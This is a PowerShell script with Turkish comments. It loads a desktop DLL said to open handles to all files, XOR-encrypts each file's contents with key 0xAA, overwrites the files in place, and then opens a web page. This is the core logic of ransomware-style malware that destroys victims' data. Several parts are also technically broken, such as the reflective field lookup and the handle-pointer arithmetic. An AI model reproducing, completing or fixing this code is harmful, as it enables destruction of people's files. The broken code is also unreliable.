# Kernel32 API fonksiyonları
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern uint SetFilePointer(IntPtr hFile, int lDistanceToMove, ref int lpDistanceToMoveHigh, uint dwMoveMethod);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# DLL’deki fonksiyonu import et
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class NativeDLL {
    [DllImport("C:\Users\Null\Desktop\file_read_open.dll")]
    public static extern void OpenAllFiles();
}
"@

# DLL fonksiyonunu çağır (dosya handle’larını açar)
[NativeDLL]::OpenAllFiles()

# Örnek: Assembly tarafından expose edilmiş handle array’i
# handlesPtr ve handleCount assembly tarafından global olarak expose edilmeli
$handlesField = [NativeDLL].GetField("handlesPtr")
$countField   = [NativeDLL].GetField("handleCount")
$ptr          = $handlesField.GetValue($null)
$count        = $countField.GetValue($null)

# Tüm handle’ları gez
for ($i=0; $i -lt $count; $i++) {
    $handle = [System.IntPtr]::new($ptr.ToInt64() + $i*8)

    $buffer = New-Object byte[] 4096
    $bytesRead = 0

    if ([Kernel32]::ReadFile($handle, $buffer, 4096, [ref]$bytesRead, [IntPtr]::Zero)) {
        # XOR şifreleme
        for ($j=0; $j -lt $bytesRead; $j++) {
            $buffer[$j] = $buffer[$j] -bxor 0xAA
        }

        $bytesWritten = 0
        [Kernel32]::SetFilePointer($handle, 0, [ref]0, 0)
        [Kernel32]::WriteFile($handle, $buffer, $bytesRead, [ref]$bytesWritten, [IntPtr]::Zero)
    }

    [Kernel32]::CloseHandle($handle)
}

# Web yönlendirme
Start-Process "https://www.example.com"
